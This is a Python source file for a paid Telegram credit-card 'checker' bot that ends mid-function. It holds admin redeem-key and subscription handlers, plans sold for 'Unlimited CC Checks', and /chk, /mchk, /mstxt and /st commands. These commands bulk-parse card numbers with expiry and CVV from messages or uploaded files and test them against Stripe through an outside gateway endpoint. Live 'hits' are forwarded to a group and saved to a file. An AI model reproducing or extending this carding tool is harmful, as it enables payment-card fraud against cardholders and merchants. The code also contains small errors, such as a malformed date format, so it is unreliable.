@bot.message_handler(func=lambda m: m.text and m.text.startswith('.generate'))
def handle_generate(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return
        
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ Invalid format. Use /generate number or .generate number")
            return
            
        try:
            num_keys = int(parts[1])
            if num_keys <= 0:
                bot.reply_to(message, "❌ Number of keys must be at least 1")
                return
            elif num_keys > 100:
                bot.reply_to(message, "⚠️ Maximum 100 keys at a time. Generating 100 keys.")
                num_keys = 100
        except ValueError:
            bot.reply_to(message, "❌ Please provide a valid number")
            return
            
        # Load existing codes from Firebase
        REDEEM_CODES = read_firebase("redeem_codes") or {}
        
        # Generate keys
        keys = []
        for _ in range(num_keys):
            # Generate a new code with the required format and length
            key = f"VOID-{''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=8))}-GOD"
            keys.append(key)
            
            # Store key with expiry (5 days from now)
            expiry_date = datetime.now() + timedelta(days=5)
            REDEEM_CODES[key] = {
                'value': 25,  # Each key gives 10 credits
                'expiry': expiry_date.strftime("%Y-%m-%d"),
                'used': False,
                'used_by': None,
                'used_date': None
            }
        
        # Save to Firebase
        if not write_firebase("redeem_codes", REDEEM_CODES):
            raise Exception("Failed to save redeem codes to Firebase")
            
        # Format the keys for display
        keys_list = "\n".join([f"➔ {key}" for key in keys])
        response = f"""
𝗥𝗲𝗱𝗲𝗲𝗺 𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱 ✅

• 𝘈𝘮𝘰𝘶𝘯𝘵 : {num_keys} 
• 𝘷𝘢𝘭𝘶𝘦: 25 credits each
• 𝘷𝘢𝘭𝘪𝘥𝘪𝘵𝘺: 5 days

<code>{keys_list}</code>

How to redeem:
Use /redeem CODE in this chat
Example: <code>/redeem VOID-HUSSLLZ7Z5Y-CHEGODCKER</code>
"""
        bot.reply_to(message, response, parse_mode='HTML')
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['redeem'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.redeem'))
def handle_redeem(message):
    try:
        # Check if user is banned
        BANNED_USERS = read_firebase("banned_users") or {}
        if str(message.from_user.id) in BANNED_USERS:
            bot.reply_to(message, "❌ You are banned from using this bot")
            return

        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ Invalid format. Use /redeem KEY or .redeem KEY")
            return

        key = parts[1].strip().upper()  # Normalize key to uppercase

        # Load all data from Firebase
        REDEEM_CODES = read_firebase("redeem_codes") or {}
        USER_CREDITS = read_firebase("user_credits") or {}
        SUBSCRIBED_USERS = read_firebase("subscribed_users") or {}

        # Debug: Print current redeem codes to check if loading properly
        print(f"Current redeem codes in Firebase: {REDEEM_CODES}")

        # Check if key exists and is valid
        if key not in REDEEM_CODES:
            bot.reply_to(message, f"❌ Invalid redeem code. No such code found in database.")
            return

        key_data = REDEEM_CODES[key]

        # Check if key is already used
        if key_data.get('used', False):
            used_by = key_data.get('used_by', 'unknown user')
            used_date = key_data.get('used_date', 'unknown date')
            bot.reply_to(message, f"❌ This code was already redeemed by {used_by} on {used_date}")
            return

        # Check if key is expired
        try:
            expiry_date = datetime.strptime(key_data['expiry'], "%Y-%m-%d")
            if datetime.now() > expiry_date:
                bot.reply_to(message, f"❌ This code expired on {key_data['expiry']}")
                return
        except KeyError:
            bot.reply_to(message, "❌ This code has no expiry date and is invalid")
            return

        # Prepare updated data
        user_id = str(message.from_user.id)
        now = datetime.now().strftime("%Y-%m-%d")
        credit_value = key_data.get('value', 10)  # Default to 10 if not specified
        
        # Initialize user credits if not exists
        if user_id not in USER_CREDITS:
            USER_CREDITS[user_id] = {
                'date': now,
                'credits': 0,
                'redeemed_credits': 0,  # Initialize this field
                'last_redeem': None
            }

        # Update user credits
        USER_CREDITS[user_id]['credits'] = USER_CREDITS[user_id].get('credits', 0) + credit_value
        USER_CREDITS[user_id]['redeemed_credits'] = USER_CREDITS[user_id].get('redeemed_credits', 0) + credit_value
        USER_CREDITS[user_id]['last_redeem'] = now

        # Update redeem code status
        REDEEM_CODES[key].update({
            'used': True,
            'used_by': user_id,
            'used_date': now
        })

        response_msg = [
            f"✅ Successfully redeemed {credit_value} credits!",
            f"💰 Your new balance: {USER_CREDITS[user_id]['credits']} credits"
        ]
        
        # Check for premium upgrade (600 credits = Basic Plan)
        if USER_CREDITS[user_id].get('redeemed_credits', 0) >= 600 and not is_user_subscribed(message.from_user.id):
            expiry_date = datetime.now() + timedelta(days=7)  # 7 days for Basic Plan
            expiry_str = expiry_date.strftime("%Y-%-%d")
            SUBSCRIBED_USERS[user_id] = {
                'plan': 1,  # Basic Plan
                'expiry': expiry_str,
                'upgraded_via': 'redeem'
            }
            response_msg.append("\n🎉 Congratulations! You've been upgraded to Basic Plan for 7 days!")
            response_msg.append(f"⏳ Plan expires on: {expiry_str}")

        # Save updates to Firebase
        update_success = True
        if not write_firebase("redeem_codes", REDEEM_CODES):
            update_success = False
        if not write_firebase("user_credits", USER_CREDITS):
            update_success = False
        if not write_firebase("subscribed_users", SUBSCRIBED_USERS):
            update_success = False

        if not update_success:
            raise Exception("Failed to update database. Please try again later.")

        # Send success message
        bot.reply_to(message, "\n".join(response_msg))

    except Exception as e:
        error_msg = [
            "❌ Failed to process redemption:",
            str(e),
            "Please contact support if this persists."
        ]
        bot.reply_to(message, "\n".join(error_msg))
        print(f"Redeem error for user {message.from_user.id}: {str(e)}")
        print(f"Traceback: {traceback.format_exc()}")  # Add this at top of file: import traceback

@bot.message_handler(commands=['broadcast'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.broadcast'))
def handle_broadcast(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return
        
    try:
        # Extract message
        broadcast_msg = message.text.split(maxsplit=1)[1].strip() if len(message.text.split()) > 1 else ""
            
        if not broadcast_msg:
            bot.reply_to(message, "❌ Please provide a message to broadcast.")
            return
            
        start_time = time.time()
        status_msg = bot.reply_to(message, "Starting broadcast...")
        
        def do_broadcast():
            try:
                # Get all data from Firebase
                user_credits = read_firebase("user_credits") or {}
                subscribed_users = read_firebase("subscribed_users") or {}
                approved_groups = read_firebase("approved_groups") or []
                
                # Prepare recipient lists
                all_users = set(user_credits.keys()).union(set(subscribed_users.keys()))
                all_groups = set(approved_groups)
                
                total = len(all_users) + len(all_groups)
                success = 0
                failed = 0
                errors = 0
                
                def update_status():
                    processing_time = time.time() - start_time
                    status_text = f"""
┌───────────────
│ 🔎 Total: {total}
│ ✅ Successful: {success}
│ ❌ Failed: {failed}
│ ⚠️ Errors: {errors}
│ ⚡ Progress: {success + failed + errors}/{total}
│ ⏱️ Time: {processing_time:.2f} S
└───────────────
"""
                    try:
                        bot.edit_message_text(
                            chat_id=message.chat.id,
                            message_id=status_msg.message_id,
                            text=status_text,
                            parse_mode='HTML'
                        )
                    except:
                        pass
                
                # Send to users
                for user_id in all_users:
                    try:
                        bot.send_message(user_id, broadcast_msg, parse_mode='HTML')
                        success += 1
                    except Exception as e:
                        failed += 1
                        print(f"Failed to send to user {user_id}: {str(e)}")
                    
                    # Update status periodically
                    if (success + failed + errors) % 5 == 0:
                        update_status()
                
                # Send to groups
                for group_id in all_groups:
                    try:
                        bot.send_message(group_id, broadcast_msg, parse_mode='HTML')
                        success += 1
                    except Exception as e:
                        if "chat not found" in str(e).lower() or "bot was kicked" in str(e).lower():
                            failed += 1
                        else:
                            errors += 1
                        print(f"Failed to send to group {group_id}: {str(e)}")
                    
                    # Update status periodically
                    if (success + failed + errors) % 5 == 0:
                        update_status()
                
                # Final update
                update_status()
            
            except Exception as e:
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=status_msg.message_id,
                    text=f"❌ Broadcast failed: {str(e)}"
                )
        
        # Start broadcast in background thread
        threading.Thread(target=do_broadcast, daemon=True).start()
    
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# Handle /buy command
@bot.message_handler(commands=['plan'])
def handle_buy(message):
    plans_text = """
┏━━━━━━━⍟
┃ 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐏𝐥𝐚𝐧𝐬
┗━━━━━━━━━━━⊛
━━━━━━━━━━━━━━━━━━
➤ 7 Days Plan - $3 💰
✧ Unlimited CC Checks
✧ No Flood Control
✧ Standard Support
✧ Rank : Basic Plan
✧ Use in DMs
✧ Increased mass check limit (30)
━━━━━━━━━━━━━━━━━━
➤ 15 Days Plan - $6 💰
✧ Unlimited CC Checks
✧ No Flood Control
✧ Priority Support
✧ Access to Private BINs
✧ Rank : Standard Plan
✧ Use in DMs
✧ Increased mass check limit (30)
━━━━━━━━━━━━━━━━━━
➤ 30 Days Plan - $10 💰
✧ Unlimited CC Checks
✧ No Flood Control
✧ VIP Support (Faster Response)
✧ Access to Private BINs
✧ Early Access to New Features
✧ Rank : Premium Plan
✧ Use in DMs
✧ Increased mass check limit (30)
━━━━━━━━━━━━━━━━━━
✧ Payment Method:
💳 UPI ID: <code>DM</code>
📩 Contact: @spydil to purchase
━━━━━━━━━━━━━━━━━━
"""
    bot.reply_to(message, plans_text, parse_mode='HTML')

# Handle both /bin and .bin
@bot.message_handler(commands=['bin'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.bin'))
def handle_bin(message):
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @voidxup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return
    
    try:
        # Extract BIN from either format
        if message.text.startswith('/'):
            parts = message.text.split()
            if len(parts) < 2:
                bot.reply_to(message, "❌ Invalid format. Use /bin BIN or .bin BIN")
                return
            bin_number = parts[1]
        else:  # starts with .
            bin_number = message.text[5:].strip()  # remove ".bin "
        
        if len(bin_number) < 6:
            bot.reply_to(message, "❌ BIN must be at least 6 digits")
            return
            
        status_msg = bot.reply_to(message, "🔍 Looking up BIN information...")
        
        def lookup_bin():
            try:
                bin_info = get_bin_info(bin_number[:6])
                if not bin_info:
                    bot.edit_message_text(chat_id=message.chat.id,
                                        message_id=status_msg.message_id,
                                        text="❌ Could not retrieve BIN information. Please try again.")
                    return
                
                response = f"""
┏━━━━━━━⍟
┃ BIN Information
┗━━━━━━━━━━━⊛

✧ 𝐁𝐈𝐍 ➳ <code>{bin_number[:6]}</code>  
✧ 𝐁𝐚𝐧𝐤 ➳ <code>{bin_info.get('bank', 'N/A')}</code>  
✧ 𝐁𝐫𝐚𝐧𝐝 ➳ <code>{bin_info.get('brand', 'N/A')}</code>  
✧ 𝐓𝐲𝐩𝐞 ➳ <code>{bin_info.get('type', 'N/A')}</code>  
✧ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➳ <code>{bin_info.get('country_name', 'N/A')}</code> {bin_info.get('country_flag', '🌐')}  
✧ 𝐋𝐞𝐯𝐞𝐥 ➳ <code>{bin_info.get('level', 'N/A')}</code>  

✧ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 ➳ <code>{message.from_user.first_name}</code>

"""
                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=response,
                                    parse_mode='HTML')
            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                     message_id=status_msg.message_id,
                                     text=f"❌ An error occurred: {str(e)}")
        
        threading.Thread(target=lookup_bin).start()
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['unsub'])
def handle_unsub(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return
        
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ Format: /unsub USER_ID")
            return
            
        user_id = parts[1]
        
        if user_id in SUBSCRIBED_USERS:
            del SUBSCRIBED_USERS[user_id]
            # Save to Firebase
            write_firebase("subscribed_users", SUBSCRIBED_USERS)
            bot.reply_to(message, f"✅ User {user_id} unsubscribed successfully!")
        else:
            bot.reply_to(message, f"❌ User {user_id} is not subscribed.")
            
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['ungrant'])
def handle_ungrant(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return

    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ Format: /ungrant GROUP_ID")
            return

        group_id = parts[1]

        if group_id in APPROVED_GROUPS:
            APPROVED_GROUPS.remove(group_id)

            # Update Firebase
            write_firebase("approved_groups", list(APPROVED_GROUPS))

            # Optional: update local file (clear and rewrite all)
            with open('approved_groups.txt', 'w') as f:
                for gid in APPROVED_GROUPS:
                    f.write(f"{gid}\n")

            bot.reply_to(message, f"✅ Group {group_id} removed from approved list!")
        else:
            bot.reply_to(message, f"❌ Group {group_id} is not in the approved list.")

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")


@bot.message_handler(commands=['res'])
def handle_res(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return
        
    try:
        parts = message.text.split()
        if len(parts) < 3:
            bot.reply_to(message, "❌ Format: /res USER_ID TIME\nExample: /res 123456 1d (1 day)\nOr: /res 123456 2h (2 hours)\nOr: /res 123456 30m (30 minutes)")
            return
            
        user_id = parts[1]
        time_str = parts[2].lower()
        
        # Calculate seconds based on input
        if time_str.endswith('d'):  # days
            seconds = int(time_str[:-1]) * 86400
            time_text = f"{time_str[:-1]} day(s)"
        elif time_str.endswith('h'):  # hours
            seconds = int(time_str[:-1]) * 3600
            time_text = f"{time_str[:-1]} hour(s)"
        elif time_str.endswith('m'):  # minutes
            seconds = int(time_str[:-1]) * 60
            time_text = f"{time_str[:-1]} minute(s)"
        else:
            bot.reply_to(message, "❌ Invalid time format. Use d=days, h=hours, m=minutes")
            return
            
        expiry_time = time.time() + seconds
        BANNED_USERS[user_id] = expiry_time
        
        # Save to file
        with open('banned_users.json', 'w') as f:
            json.dump(BANNED_USERS, f)
            
        bot.reply_to(message, f"✅ User {user_id} restricted for {time_text}!")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['unres'])
def handle_unres(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return
        
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ Format: /unres USER_ID")
            return
            
        user_id = parts[1]
        
        if user_id in BANNED_USERS:
            del BANNED_USERS[user_id]
            with open('banned_users.json', 'w') as f:
                json.dump(BANNED_USERS, f)
            bot.reply_to(message, f"✅ User {user_id} unrestricted successfully!")
        else:
            bot.reply_to(message, f"❌ User {user_id} is not restricted.")
            
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")



# Handle both /chk and .chk
@bot.message_handler(commands=['chk'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.chk'))

def handle_chk(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @voidxup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.Send Username & Chat Id of this Group Here @spydil To get approved")
        return



    # Check flood control for non-subscribed users
    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands. Buy a plan to remove this limit.")
        return

    # Check credits for non-subscribed users
    if not is_user_subscribed(message.from_user.id):
        if not check_user_credits(message.from_user.id, 1):
            remaining = get_remaining_credits(message.from_user.id)
            bot.reply_to(message, f"❌ You've used all your daily credits ({DAILY_CREDITS}). Remaining: {remaining}. Subscribe or wait for daily reset.")
            return
        deduct_credits(message.from_user.id, 1)

    try:
        # Extract card from either format
        if message.text.startswith('/'):
            parts = message.text.split()
            if len(parts) < 2:
                bot.reply_to(message, "❌ Invalid format. Use /chk CC|MM|YYYY|CVV or .chk CC|MM|YYYY|CVV")
                return
            cc = parts[1]
        else:  # starts with .
            cc = message.text[5:].strip()  # remove ".chk "

        start_time = time.time()

        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name

        status_msg = bot.reply_to(message, "↯ Checking..\n\n⌯ 𝐂𝐚𝐫𝐝 - <code>{}</code>\n⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>Stripe Auth</i> \n⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - <i>Processing</i>".format(cc), parse_mode='HTML')

        def check_card():
            try:
                result = check_new_api_cc(cc)
                result['user_id'] = message.from_user.id  # Added line to include user ID
                processing_time = time.time() - start_time
                response_text = format_single_response(result, user_full_name, processing_time)

                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=response_text,
                                      parse_mode='HTML')

                try:
                    if any(keyword in response_text.upper() for keyword in ["APPROVED", "CHARGED", "LIVE"]):
                        bot.send_message(HITS_GROUP_ID, response_text, parse_mode="HTML")
                except Exception as e:
                    print(f"[Auto Forward Error] {e}")

            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=f"❌ An error occurred: {str(e)}")

        threading.Thread(target=check_card).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")


import threading, re
from concurrent.futures import ThreadPoolExecutor, as_completed

ACTIVE = {}          # {user_id: {'mid':msg_id, 'cid':chat_id, 'stop':False, 'stats':{...}}}
BATCH = 12           # Speed king

@bot.message_handler(commands=['mstxt'])
def mstxt(msg):
    uid = msg.from_user.id
    cid = msg.chat.id

    # Already running? Show live status instantly
    if uid in ACTIVE:
        bot.reply_to(msg, "🔥 LIVE CHECKING RUNNING\nStatus below 👇")
        show_live(ACTIVE[uid]['mid'], ACTIVE[uid]['cid'], ACTIVE[uid]['stats'])
        return

    # Validate file
    if not (msg.reply_to_message and msg.reply_to_message.document and msg.reply_to_message.document.file_name.endswith('.txt')):
        return bot.reply_to(msg, "Reply to .txt file with CCs")

    status = bot.reply_to(msg, "MASS COOKING STARTED 🍳🔥")
    ACTIVE[uid] = {
        'mid': status.message_id,
        'cid': cid,
        'stop': False,
        'stats': {'cc':'', 'resp':'Loading...', 'app':0, 'dec':0, 'chk':0, 'tot':0}
    }

    def show_live(mid, cid, s):
        cc = s['cc'][:8] + "****" + s['cc'][-4:] if s['cc'] else "Waiting"
        kb = {"inline_keyboard": [
            [{"text": f"cc: {cc}", "callback_data":"live"}],
            [{"text": f"status: {s['resp'][:28]}", "callback_data":"live"}],
            [{"text": f"approve: [ {s['app']} ]", "callback_data":"live"}],
            [{"text": f"declined: [ {s['dec']} ]", "callback_data":"live"}],
            [{"text": f"checked: {s['chk']}/{s['tot']}", "callback_data":"live"}],
            [{"text": "STOP", "callback_data": f"stop_{uid}"}]
        ]}
        try:
            bot.edit_message_text(chat_id=cid, message_id=mid, text="LIVE MASS CHECKER 🔥", reply_markup=kb)
        except: pass

    def run():
        ccs = []
        try:
            file = bot.get_file(msg.reply_to_message.document.file_id)
            data = bot.download_file(file.file_path).decode()
            for line in data.splitlines():
                m = re.search(r'(\d{15,16})\|?(\d{1,2})\|?(\d{2,4})\|?(\d{3,4})', line)
                if m:
                    cc,mm,yy,cvv = m.groups()
                    yy = yy if len(yy)==4 else '20'+yy
                    ccs.append(f"{cc}|{mm}|{yy}|{cvv}")
        except: pass

        if not ccs:
            bot.edit_message_text("No valid CCs found", cid, status.message_id)
            ACTIVE.pop(uid, None)
            return

        tot = min(len(ccs), 999 if uid in ADMIN_IDS else 300)
        ACTIVE[uid]['stats']['tot'] = tot
        ccs = ccs[:tot]

        app = dec = chk = 0
        show_live(status.message_id, cid, ACTIVE[uid]['stats'])

        with ThreadPoolExecutor(max_workers=20) as ex:
            for i in range(0, tot, BATCH):
                if ACTIVE[uid]['stop']: break
                batch = ccs[i:i+BATCH]
                futures = {ex.submit(check_new_api_cc, cc): cc for cc in batch}
                for f in as_completed(futures):
                    if ACTIVE[uid]['stop']: break
                    cc = futures[f]
                    try:
                        r = f.result()
                        resp = r.get('response','') or r.get('message','Unknown')
                        chk += 1

                        # LIVE DETECTION — catches everything
                        live = (
                            r.get('status','').upper() in ["APPROVED","LIVE","CHARGED","SUCCESS"] or
                            any(word in resp.upper() for word in ["APPROVED","CHARGED $","SUCCESS","LIVE","CVV MATCH","AUTH"])
                        )

                        if live:
                            app += 1
                            bot.send_message(cid, format_single_response(r, msg.from_user.first_name or "User", 0), parse_mode='HTML')
                            try: bot.send_message(HITS_GROUP_ID, format_single_response(r, msg.from_user.first_name or "User", 0), parse_mode='HTML')
                            except: pass
                        else:
                            dec += 1

                        ACTIVE[uid]['stats'].update({'cc':cc, 'resp':resp, 'app':app, 'dec':dec, 'chk':chk})
                        show_live(status.message_id, cid, ACTIVE[uid]['stats'])

                    except:
                        dec += 1
                        chk += 1
                        ACTIVE[uid]['stats'].update({'chk':chk, 'dec':dec})
                        show_live(status.message_id, cid, ACTIVE[uid]['stats'])

        final = f"""CHECKING COMPLETE!

Approve: {app}
Declined: {dec}
Checked: {chk}/{tot}"""
        bot.edit_message_text(final, cid, status.message_id)
        ACTIVE.pop(uid, None)

    threading.Thread(target=run, daemon=True).start()

@bot.callback_query_handler(func=lambda c: c.data.startswith('stop_'))
def stop(call):
    uid = int(call.data.split('_')[1])
    if uid in ACTIVE:
        ACTIVE[uid]['stop'] = True
        bot.edit_message_text(call.message.text + "\n\nSTOPPED BY USER", call.message.chat.id, call.message.message_id)
        ACTIVE.pop(uid, None)
        bot.answer_callback_query(call.id, "Stopped")
# Handle both /mchk and .mchk
@bot.message_handler(commands=['mchk'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.mchk'))
def handle_mchk(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @voidxup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return
    

    
    # Check flood control for non-subscribed users
    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands. Buy a plan to remove this limit.")
        return
    
    # Check mass check cooldown
    if not check_mass_check_cooldown(message.from_user.id):
        bot.reply_to(message, "⚠️ You are doing things too fast! Please wait 20 seconds between mass checks.")
        return
    
    try:
        cards_text = None
        command_parts = message.text.split()
        
        # Check if cards are provided after command
        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return
            
        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())
        
        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YYYY|CVV).")
            return
        
        # Determine max limit based on subscription status
        max_limit = MAX_SUBSCRIBED_CARDS_LIMIT if is_user_subscribed(message.from_user.id) else MAX_CARDS_LIMIT
        
        if len(cards) > max_limit:
            cards = cards[:max_limit]
            bot.reply_to(message, f"⚠️ Maximum {max_limit} cards allowed. Checking first {max_limit} cards only.")
        
        # Check credits for non-subscribed users
        if not is_user_subscribed(message.from_user.id):
            if not check_user_credits(message.from_user.id, len(cards)):
                remaining = get_remaining_credits(message.from_user.id)
                bot.reply_to(message, f"❌ Not enough credits. You need {len(cards)} credits but only have {remaining} left today. Subscribe or wait for daily reset.")
                return
            deduct_credits(message.from_user.id, len(cards))
        
        start_time = time.time()
            
        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name
            
        status_msg = bot.reply_to(message, f"↯ Checking {len(cards)} cards...", parse_mode='HTML')
        
        def check_cards():
            try:
                results = []
                for i, card in enumerate(cards, 1):
                    try:
                        result = check_new_api_cc(card)
                        results.append(result)
                        
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                    except Exception as e:
                        results.append({
                            'status': 'ERROR',
                            'card': card,
                            'message': f'Invalid: {str(e)}',
                            'brand': 'UNKNOWN',
                            'country': 'UNKNOWN 🌐',
                            'type': 'UNKNOWN',
                            'gateway':'Stripe Auth'
                        })
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                
                processing_time = time.time() - start_time
                response_text = format_mchk_response(results, len(cards), processing_time)
                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=response_text,
                                    parse_mode='HTML')
            
            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                     message_id=status_msg.message_id,
                                     text=f"❌ An error occurred: {str(e)}",
                                     parse_mode='HTML')
        
        threading.Thread(target=check_cards).start()
    
    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")

def check_st_cc(cc):
    try:
        card = cc.replace('/', '|').replace(':', '|').replace(' ', '|')
        parts = [x.strip() for x in card.split('|') if x.strip()]
        if len(parts) < 4:
            return {
                'status': 'ERROR', 'card': cc, 'message': 'Invalid format',
                'brand': 'UNKNOWN', 'country': 'UNKNOWN 🌐', 'type': 'UNKNOWN',
                'gateway': 'Stripe [5$]'
            }

        cc_num, mm, yy_raw, cvv = parts[:4]
        mm = mm.zfill(2)
        yy = yy_raw[2:] if yy_raw.startswith("20") else yy_raw
        formatted_cc = f"{cc_num}|{mm}|{yy}|{cvv}"

        brand = country_name = card_type = bank = 'UNKNOWN'
        country_flag = '🌐'
        try:
            bin_data = requests.get(f"https://bins.antipublic.cc/bins/{cc_num[:6]}", timeout=5).json()
            brand = bin_data.get('brand', 'UNKNOWN')
            country_name = bin_data.get('country_name', 'UNKNOWN')
            country_flag = bin_data.get('country_flag', '🌐')
            card_type = bin_data.get('type', 'UNKNOWN')
            bank = bin_data.get('bank', 'UNKNOWN')
        except: pass

        res = requests.get(f"https://mx-stripe-5.onrender.com/gate=mx/key=voidboy/{formatted_cc}", timeout=300)
        data = res.json() if res.status_code == 200 else {}
        status = data.get("status", "DECLINED").upper()
        msg = data.get("response", "No response from gateway.")

        if "APPROVED" in status:
            status = "APPROVED"
            with open("HITS.txt", "a") as f: f.write(formatted_cc + "\n")
        elif "DECLINED" in status:
            status = "DECLINED"
        elif "CCN" in msg.upper():
            status = "CCN"
        else:
            status = "ERROR"

        return {
            'status': status, 'card': formatted_cc, 'message': msg,
            'brand': brand, 'country': f"{country_name} {country_flag}",
            'type': card_type, 'gateway': 'Stripe [5$]'
        }

    except Exception as e:
        return {
            'status': 'ERROR', 'card': cc, 'message': f"Exception: {str(e)}",
            'brand': 'UNKNOWN', 'country': 'UNKNOWN 🌐', 'type': 'UNKNOWN',
            'gateway': 'Stripe [5$]'
        }

@bot.message_handler(commands=['st'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.st'))
def handle_st(message):
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. Join @voidxup or subscribe to use.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved. Send details to @spydil to get approved.")
        return

    if not confirm_time():
        bot.reply_to(message, "❌ Checker is down. Follow @spydil for updates.")
        return

    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands. Buy a plan to remove this limit.")
        return

    if not is_user_subscribed(message.from_user.id):
        if not check_user_credits(message.from_user.id, 1):
            remaining = get_remaining_credits(message.from_user.id)
            bot.reply_to(message, f"❌ Daily credits used up. Remaining: {remaining}.")
            return
        deduct_credits(message.from_user.id, 1)

    try:
        cc = None
        if message.text.startswith('/') or message.text.startswith('.'):
            parts = message.text.split()
            if len(parts) >= 2:
                cc = parts[1]
        if not cc and message.reply_to_message:
            cc = message.reply_to_message.text.strip()

        if not cc:
            return bot.reply_to(message, "❌ Provide card in format or reply to message.")

        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name

        start_time = time.time()
        status_msg = bot.reply_to(message, f"↯ Checking..\n\n⌯ 𝐂𝐚𝐫𝐝 - <code>{cc}</code>\n⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 - <i>Stripe [5$]</i>\n⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - <i>Processing</i>", parse_mode='HTML')

        def check_card():
            try:
                result = check_st_cc(cc)
                result['user_id'] = message.from_user.id
                processing_time = time.time() - start_time
